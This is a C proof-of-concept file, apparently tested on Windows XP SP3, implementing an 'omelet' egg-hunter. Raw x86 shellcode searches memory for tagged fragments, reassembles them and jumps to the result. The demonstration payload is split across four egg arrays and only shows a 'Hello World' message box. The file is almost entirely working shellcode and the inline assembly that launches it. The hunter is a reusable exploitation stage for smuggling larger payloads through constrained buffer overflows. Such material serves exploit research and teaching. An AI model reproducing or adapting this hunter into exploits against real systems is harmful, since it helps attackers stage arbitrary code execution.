/* 
	Test on Win xp sp3

*/


/*

 egg struct:

    ------------------------------------------------------------
	|	1 byte   |    1 byte   |  3 bytes   |   egg_size bytes |
	------------------------------------------------------------
	|   EggSize  |   EggIndex  |   EggMark  |     EggData      |


e.g.:
	
	unsigned char egg_1[] = "\x03" "\xFF" "\x11\x22\x33" "\x90\x90\x90";
	unsigned char egg_2[] = "\x03" "\xFE" "\x11\x22\x33" "\x90\x90\x90";
	unsigned char egg_3[] = "\x03" "\xFD" "\x11\x22\x33" "\x90\x90\xcc";
	
	size(egg_1) = 0x03
	size(egg_2) = 0x03
	size(egg_3) = 0x03

	index(egg_1) = 0xFF ^ 0xFF = 0
	index(egg_2) = 0xFF ^ 0xFE = 1
	index(egg_3) = 0xFF ^ 0xFD = 2

	mark(egg_1) = mark(egg_2) = mark(egg_3) = "\x11\x22\x33"

	data(egg1)  = "\x90\x90\x90"
	data(egg2)  = "\x90\x90\x90"
	data(egg3)  = "\x90\x90\xcc"
	
*/


unsigned char HuntEggCode[84]=
"\x33\xff\xeb\x23\x51\x64\x89\x20\xfc\xb0\x20\xf2\xae\x50\x8b\xf7"
"\xad\x35\xff\x11\x22\x33\x83\xf8\x03\x77\x0c\x59\xf7\xe9\x64\x03"
"\x42\x08\x97\xf3\xa4\x8b\xfe\x33\xc0\x64\x8b\x08\x8b\xe1\x59\x83"
"\xf9\xff\x75\xf8\x5a\xe8\xca\xff\xff\xff\x61\x8d\x66\x18\x58\x66"
"\x0d\xff\x0f\x40\x3d\x01\x01\x01\x01\x77\x03\x97\xeb\xd9\x33\xc0"
"\x64\xff\x50\x08";




/* messagebox shellcode*/
unsigned char shellcode[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7"
"\x68\x72\x6c\x64\x01"
"\x68\x6f\x20\x57\x6f"
"\x68\x48\x65\x6c\x6c"
"\x89\xe1\xfe\x49\x0b\x31\xc0\x51\x50\xff\xd7";



unsigned char egg_0[37]=
"\x20\xff\x11\x22\x33\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b"
"\x52\x1c\x8b\x42\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2"
"\x89\xc7\x03\x78\x3c";

unsigned char egg_1[37]=
"\x20\xfe\x11\x22\x33\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31"
"\xed\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81"
"\x7e\x08\x45\x78\x69";

unsigned char egg_2[37]=
"\x20\xfd\x11\x22\x33\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x72\x6c\x64"
"\x01\x68\x6f\x20\x57";

unsigned char egg_3[37]=
"\x20\xfc\x11\x22\x33\x6f\x68\x48\x65\x6c\x6c\x89\xe1\xfe\x49\x0b"
"\x31\xc0\x51\x50\xff\xd7\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
"\x90\x90\x90\x90\x90";



int main(int argc, char **argv) {

	/* 此处如果不引用egg_x的话，egg_x会被编译器优化，这样egg hunt在内存中就搜索不到egg_x了*/
	__asm{lea eax,egg_0}
	__asm{lea eax,egg_1}
	__asm{lea eax,egg_2}
	__asm{lea eax,egg_3}

	
	__asm{
		lea eax,HuntEggCode;
		jmp eax;
	}

	return (0);
}